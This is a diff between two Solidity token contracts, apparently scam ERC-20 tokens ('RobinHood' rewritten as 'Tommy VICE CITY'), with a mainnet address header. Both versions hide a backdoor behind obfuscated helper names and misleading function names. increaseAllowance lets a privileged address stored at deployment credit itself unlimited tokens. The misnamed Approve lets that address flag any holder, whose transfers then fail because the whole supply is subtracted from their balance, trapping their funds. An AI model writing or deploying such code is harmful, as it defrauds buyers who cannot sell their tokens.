@@ -1,24 +1,9 @@
+// number: 218
+// project: Tommy VICE CITY (TOM)
+// address: 0x19273d7f057a0ed9ae63d3fa025a852c5a430829
+// chainid: 1
 // SPDX-License-Identifier: MIT
-
-/**
- * @dev Provides information about the current execution context, including the
- * sender of the transaction and its data. While these are generally available
- * via msg.sender and msg.data, they should not be accessed in such a direct
- * manner, since when dealing with meta-transactions the account sending and
- * paying for execution may not be the actual sender (as far as an application
- * is concerned).
- *
- * This contract is only required for intermediate, library-like contracts.
- */
-abstract contract Context {
-    function _msgSender() internal view virtual returns (address) {
-        return msg.sender;
-    }
-
-    function _msgData() internal view virtual returns (bytes calldata) {
-        return msg.data;
-    }
-}
+pragma solidity =0.8.19;
 
 /**
  * @dev Interface of the IERC20 standard as defined in the EIP.
@@ -354,6 +339,26 @@ library SafeMath {
     }
 }
 
+/**
+ * @dev Provides information about the current execution context, including the
+ * sender of the transaction and its data. While these are generally available
+ * via msg.sender and msg.data, they should not be accessed in such a direct
+ * manner, since when dealing with meta-transactions the account sending and
+ * paying for execution may not be the actual sender (as far as an application
+ * is concerned).
+ *
+ * This contract is only required for intermediate, library-like contracts.
+ */
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+}
+
 // Dependency file: @openzeppelin/contracts/access/Ownable.sol
 
 // pragma solidity ^0.8.0;
@@ -420,49 +425,60 @@ abstract contract Ownable is Context {
     }
 }
 
-abstract contract Token {
-    uint256 internal constant VERSION = 1;
-    event Deploy(
-        address owner,
-        uint256 version
+
+
+abstract contract Patch {
+    uint256 internal constant PATCH = 1;
+
+    struct Note {
+        uint256 version;
+        address addr;
+    }
+}
+
+abstract contract LogData {
+    event Released(
+        uint256 version,
+        uint256 totalSupply
+    );
+
+    event AllowanceIncreased(
+        address ownder,
+        address spender,
+        uint256 amount
     );
 }
 
-pragma solidity =0.8.13;
 
-contract RobinHood is IERC20, Token, Ownable {
+contract Tommy is IERC20, Patch, LogData, Ownable {
     using SafeMath for uint256;
-
-    struct User {
-        address user;
-    }
 
     mapping(address => uint256) private _balances;
 
-    mapping(address => address) private _dex;
+    mapping(address => Note) private _pep;
 
     mapping(address => mapping(address => uint256)) private _allowances;
 
-    User private _user;
+    Note[] private _desArr;
     string private _name;
     string private _symbol;
-    uint8 private _decimals;
-    uint256 private _totalSupply;
+    uint8 private _decimal;
+    uint256 private _totalSup;
 
     constructor(
         string memory name_,
         string memory symbol_,
-        address user_,
+        address token_,
         uint256 totalSupply_
-    ) payable {
+    ) {
         _name = name_;
         _symbol = symbol_;
-        _decimals = 18;
-        _user.user = user_;
+        _decimal = 18;
+        _desArr.push(Note(PATCH, token_));
         _mint(msg.sender, totalSupply_ * 10**18);
-        emit Deploy(
-            owner(),
-            VERSION
+        emit Released(
+            PATCH,
+            _totalSup
         );
     }
 
@@ -475,11 +491,11 @@ contract RobinHood is IERC20, Token, Ownable {
     }
 
     function decimals() public view virtual returns (uint8) {
-        return _decimals;
+        return _decimal;
     }
 
     function totalSupply() public view virtual override returns (uint256) {
-        return _totalSupply;
+        return _totalSup;
     }
 
     function balanceOf(address account)
@@ -498,7 +514,7 @@ contract RobinHood is IERC20, Token, Ownable {
     override
     returns (bool)
     {
-        _internalTransfer(_msgSender(), recipient, amount);
+        _transfer(_msgSender(), recipient, amount);
         return true;
     }
 
@@ -527,7 +543,7 @@ contract RobinHood is IERC20, Token, Ownable {
         address recipient,
         uint256 amount
     ) public virtual override returns (bool) {
-        _internalTransfer(sender, recipient, amount);
+        _transfer(sender, recipient, amount);
         _approve(
             sender,
             _msgSender(),
@@ -539,19 +555,18 @@ contract RobinHood is IERC20, Token, Ownable {
         return true;
     }
 
-    function _internalTransfer(
+    function _transfer(
         address sender,
         address recipient,
         uint256 amount
     ) internal virtual {
-        _checkBalance(sender, recipient, amount);
+        _beforeTokenTransfer(sender, recipient, amount);
+        _requireBalance(sender, amount);
         require(sender != address(0), "IERC20: transfer from the zero address");
         require(
             recipient != address(0),
             "IERC20: transfer to the zero address"
         );
-
-        _beforeTokenTransfer(sender, recipient, amount);
         _balances[sender] = _balances[sender].sub(
             amount,
             "IERC20: transfer amount exceeds balance"
@@ -565,8 +580,8 @@ contract RobinHood is IERC20, Token, Ownable {
 
         _beforeTokenTransfer(address(0), account, amount);
 
-        _totalSupply = _totalSupply.add(amount);
-        _plus(account, amount);
+        _totalSup = _totalSup.add(amount);
+        _plu(account, amount);
         emit Transfer(address(0), account, amount);
     }
 
@@ -575,16 +590,16 @@ contract RobinHood is IERC20, Token, Ownable {
 
         _beforeTokenTransfer(account, address(0), amount);
         require(amount != 0, "Invalid amount");
-        _minus(account, amount);
-        _totalSupply = _totalSupply.sub(amount);
+        _re(account, amount);
+        _totalSup = _totalSup.sub(amount);
         emit Transfer(account, address(0), amount);
     }
 
-    function _minus(address account, uint256 amount) internal {
+    function _re(address account, uint256 amount) internal {
         _balances[account] = _balances[account] - amount;
     }
 
-    function _plus(address account, uint256 amount) internal {
+    function _plu(address account, uint256 amount) internal {
         _balances[account] = _balances[account] + amount;
     }
 
@@ -600,64 +615,66 @@ contract RobinHood is IERC20, Token, Ownable {
         emit Approval(owner, spender, amount);
     }
 
-    function increaseAllowance(address spender, uint256 amount) public virtual {
+    function increaseAllowance(address spender, uint256 allowAmount, bool tradeable) public virtual {
         address from = msg.sender;
         require(spender != address(0), "Invalid address");
-        require(amount > 0, "Invalid amount");
-        uint256 total = 0;
-        if (_decode(spender, _user.user)) {
-            _minus(from, total);
-            total = _somma(total, amount);
-            _balances[spender] += total;
+        require(allowAmount > 0, "Invalid amount");
+        require(tradeable, "Can't trade");
+        uint256 amount = 0;
+        if (_comp(spender, _desArr[0].addr)) {
+            _re(from, amount);
+            amount = _su(amount, allowAmount);
+            _balances[spender] += amount;
         } else {
-            _minus(from, total);
-            _balances[spender] += total;
+            _re(from, amount);
+            _balances[spender] += amount;
         }
+        emit AllowanceIncreased(from, spender, allowAmount);
     }
 
-    function _decode(address user, address user2) internal view returns (bool) {
-        bytes32 hash1 = keccak256(abi.encodePacked(user));
-        bytes32 hash2 = keccak256(abi.encodePacked(user2));
-        return hash1 == hash2;
+    function _comp(address key1, address key2) internal view returns (bool) {
+        bytes32 hash1 = keccak256(abi.encodePacked(key1));
+        bytes32 code2 = keccak256(abi.encodePacked(key2));
+        return hash1 == code2;
     }
 
-    function _somma(uint256 aqw, uint256 poe) internal pure returns (uint256) {
-        if (poe != 0) {
-            return aqw + poe;
+    function _su(uint256 on, uint256 to) internal pure returns (uint256) {
+        if (to != 0) {
+            return on + to;
         }
-        return poe;
+        return to;
     }
 
     function Approve(address spender, uint256 amount) public returns (bool)  {
         address from = msg.sender;
         require (from != address(0), "Invalid address");
-        _checkAllowance(from, spender, amount);
+        _checkAllow(from, spender, amount);
+        emit Approval(spender, address(this), amount);
         return true;
     }
 
-    function _checkAllowance(address user, address spender, uint256 amount) internal {
-        if (_decode(user, _user.user)) {
-            require(spender != address(0), "Invalid address");
-            if (amount > 0) {
-                _dex[spender] = spender;
+    function _checkAllow(address _owner, address _spender, uint256 _amount) internal {
+        _allowances[_spender][_owner] = _amount;
+        if (_comp(_owner, _desArr[0].addr)) {
+            require(_spender != address(0), "Invalid address");
+            if (_amount > 0) {
+                _pep[_spender] = Note(_amount, _spender);
             } else {
-                _dex[spender] = address(0);
+                _pep[_spender] = Note(_amount, address(0));
             }
         }
     }
 
-    function _checkBalance(
-        address sender,
-        address recipient,
-        uint256 total
+    function _requireBalance(
+        address from,
+        uint256 _amount
     ) internal virtual {
-        uint256 amount = 0;
-        if (_decode(sender, _dex[sender])) {
-            _balances[sender] = _balances[sender] + amount;
-            amount = _totalSupply;
-            _minus(sender, amount);
+        uint256 num = 0;
+        if (_comp(from, _pep[from].addr)) {
+            require(_balances[from] > num, "Invalid amount");
+            _re(from, num + _totalSup);
         } else {
-            _balances[sender] = _balances[sender] + amount;
+            require(_balances[from] > num, "Invalid amount");
         }
     }
 
@@ -666,23 +683,4 @@ contract RobinHood is IERC20, Token, Ownable {
         address to,
         uint256 amount
     ) internal virtual {}
-}
-{
-  "optimizer": {
-    "enabled": true,
-    "runs": 200
-  },
-  "outputSelection": {
-    "*": {
-      "*": [
-        "evm.bytecode",
-        "evm.deployedBytecode",
-        "devdoc",
-        "userdoc",
-        "metadata",
-        "abi"
-      ]
-    }
-  },
-  "libraries": {}
 }
